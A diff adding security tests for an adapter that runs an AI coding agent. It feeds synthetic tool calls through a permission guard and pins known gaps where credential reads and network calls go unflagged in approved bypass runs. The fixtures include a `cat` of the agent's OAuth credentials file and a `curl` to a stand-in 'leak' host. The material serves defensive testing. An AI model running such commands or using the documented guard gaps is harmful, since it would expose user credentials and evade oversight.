@@ -13,6 +13,7 @@ import { privilegedProfile, scopeShapes } from "../fixtures/privileged.js";
 import { PreflightCache } from "../preflight-cache.js";
 import { providerEntry } from "../providers.js";
 import { AdapterRegistry } from "../registry.js";
+import { guardEvent } from "../tool-guard.js";
 import type {
   CompileRequest,
   ExitInfo,
@@ -905,4 +906,93 @@ describe("antigravity conformance suite (synthetic recorded fixtures, FR-ADP-11,
       expect(report.result?.failureDetail).toBe("exit code 64");
     },
   );
+});
+
+describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-POL-06; SYNTHETIC lines)", () => {
+  // The shared leg is test/malicious/adapters/antigravity.case.ts; these pin what is specific to Antigravity.
+  const CID = "0b6c2d1e-0000-4000-8000-0000000000bb";
+  const HOME = "/home/synthetic";
+  const j = (o: Record<string, unknown>) => JSON.stringify(o);
+  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
+  const tool = (name: string, parameters: Record<string, string>) =>
+    j({
+      event: "step_update",
+      conversation_id: CID,
+      step_index: 1,
+      state: "ACTIVE",
+      step_type: "tool",
+      tool_name: name,
+      tool_info: { name, parameters },
+    });
+  const result = (over: Record<string, unknown> = {}) =>
+    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "", usage: USAGE, ...over } });
+  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
+  /** Lines through the parser and the tool-call guard as an approved bypass run sees them, then the result. */
+  const run = (lines: string[]) => {
+    const a = adapter();
+    const state: ParseState = { lines: 0, unknownEvents: 0 };
+    const ctx = { cwd: "/work/tree", home: HOME, bypass: true };
+    const events = lines.flatMap((l) => a.parseEvent(l, state)).map((e) => guardEvent(e, ctx));
+    return { events, result: a.extractResult(events, EXIT0) };
+  };
+
+  it.each(["disabled", "approved"] as const)(
+    "repository_config %s is refused, never compiled as enabled (FR-POL-04 is not shown; live check C11)",
+    (mode) => {
+      const profile = { ...privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode } }), bypassApproved: true };
+      const r = adapter().compile(request({ bypassApproved: true }), profile);
+      expect(r).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
+      if ("ineligible" in r) expect(r.detail).toContain("C11");
+    },
+  );
+
+  it("the compiled argv and env name no Antigravity state directory or repository instruction source", () => {
+    const r = compiled();
+    const text = [...r.argv, ...Object.keys(r.env), ...Object.values(r.env)].join("\n");
+    for (const s of [".gemini", "GEMINI.md", "AGENTS.md", ".agents", "mcp_config.json", "hooks.json"]) {
+      expect(text, s).not.toContain(s);
+    }
+  });
+
+  it.each([
+    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
+    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
+    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
+  ])("a reported denial of a %s ends PERMISSION_BLOCKED at exit 0 although status is SUCCESS", (_n, name, params) => {
+    const { result: r } = run([
+      tool(name, params),
+      result({ denied_actions: [{ action: "synthetic", display_name: "Synthetic" }] }),
+    ]);
+    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
+  });
+
+  // The gap the leg's streams do not hide: in an approved bypass run the guard enforces only Git writes (ADR-0039,
+  // owner decision 25) and `--dangerously-skip-permissions` approves every tool ([H]), so the same calls with no
+  // reported denial end ok. If this starts failing, a control was added: update the T4.36 roadmap row.
+  it.each([
+    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
+    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
+    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
+  ])("bypass gap pinned: an unreported %s with no denial ends ok", (_n, name, params) => {
+    const { events, result: r } = run([tool(name, params), result()]);
+    expect(events.some((e) => e.kind === "tool_call" && e.violation !== undefined)).toBe(false);
+    expect(r.ok).toBe(true);
+  });
+
+  it("the guard flags a Git write in the bypass run and classifies it PERMISSION_BLOCKED (ADR-0017, ADR-0039)", () => {
+    const { events } = run([tool("run_command", { command: "git push origin main" }), result()]);
+    expect(events).toContainEqual(expect.objectContaining({ kind: "tool_call", violation: expect.anything() }));
+    expect(events.some((e) => e.kind === "tool_call" && "command" in e)).toBe(false);
+    expect(
+      adapter().classifyFailure({ events, exit: EXIT0, stderrTail: "", timedOut: false, cancelled: false }),
+    ).toEqual(expect.objectContaining({ code: "PERMISSION_BLOCKED" }));
+  });
+
+  // KNOWN GAP, pinned (T4.36 roadmap row): ADR-0039 says a `git_write` verdict ends the run PERMISSION_BLOCKED, but
+  // `extractResult` returns ok for a clean SUCCESS envelope without looking at `tool_call.violation`, and the lifecycle
+  // trusts `result.ok`. `it.fails` turns red once the adapter fails the run; then make this a plain `it`.
+  it.fails("KNOWN GAP: a guard-flagged Git write with a SUCCESS envelope ends PERMISSION_BLOCKED", () => {
+    const { result: r } = run([tool("run_command", { command: "git push origin main" }), result()]);
+    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
+  });
 });
